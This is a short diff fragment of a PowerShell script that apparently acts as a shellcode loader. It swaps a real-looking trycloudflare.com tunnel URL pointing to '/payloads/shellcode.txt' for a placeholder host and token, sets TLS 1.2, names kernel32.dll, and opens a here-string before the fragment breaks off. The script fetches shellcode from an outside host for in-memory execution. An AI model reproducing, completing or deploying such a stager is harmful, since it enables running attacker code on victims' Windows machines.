@@ -1,4 +1,4 @@
-$u="https://spots-benefit-herb-mods.trycloudflare.com/payloads/shellcode.txt?key=7fd57214ed9dddd9"
+$u="https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN"
 [Net.ServicePointManager]::SecurityProtocol="Tls12"
 $k="kernel32.dll"
 $c=@"
